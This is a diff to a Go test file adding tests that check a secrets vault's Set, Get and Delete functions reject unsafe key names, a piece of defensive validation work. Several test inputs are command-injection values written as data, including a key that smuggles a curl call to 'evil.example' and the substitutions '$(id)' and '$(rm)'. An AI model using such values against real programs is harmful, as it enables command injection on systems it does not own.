@@ -145,6 +145,54 @@ func TestSet_RejectsMalformedKeyval(t *testing.T) {
 	}
 }
 
+func TestValidateSecretKey_RejectsUnsafeNames(t *testing.T) {
+	cleanup := setupVaultDir(t)
+	defer cleanup()
+
+	for _, key := range []string{
+		"MY_KEY; curl https://evil.example",
+		"$(id)",
+		"123BAD",
+		"",
+		"has-dash",
+		"has space",
+	} {
+		t.Run(key, func(t *testing.T) {
+			if err := Set("v1", key+"=secret"); err == nil {
+				t.Fatalf("Set(%q) expected error", key)
+			} else if !strings.Contains(err.Error(), "valid env var name") {
+				t.Fatalf("Set(%q) error = %v, want validation message", key, err)
+			}
+		})
+	}
+}
+
+func TestGet_RejectsInvalidKeyName(t *testing.T) {
+	cleanup := setupVaultDir(t)
+	defer cleanup()
+
+	err := Get("v1", "bad;key")
+	if err == nil {
+		t.Fatal("expected error")
+	}
+	if !strings.Contains(err.Error(), "valid env var name") {
+		t.Errorf("got: %v", err)
+	}
+}
+
+func TestDelete_RejectsInvalidKeyName(t *testing.T) {
+	cleanup := setupVaultDir(t)
+	defer cleanup()
+
+	err := Delete("v1", "$(rm)")
+	if err == nil {
+		t.Fatal("expected error")
+	}
+	if !strings.Contains(err.Error(), "valid env var name") {
+		t.Errorf("got: %v", err)
+	}
+}
+
 func TestJqEscape(t *testing.T) {
 	cases := []struct {
 		input string
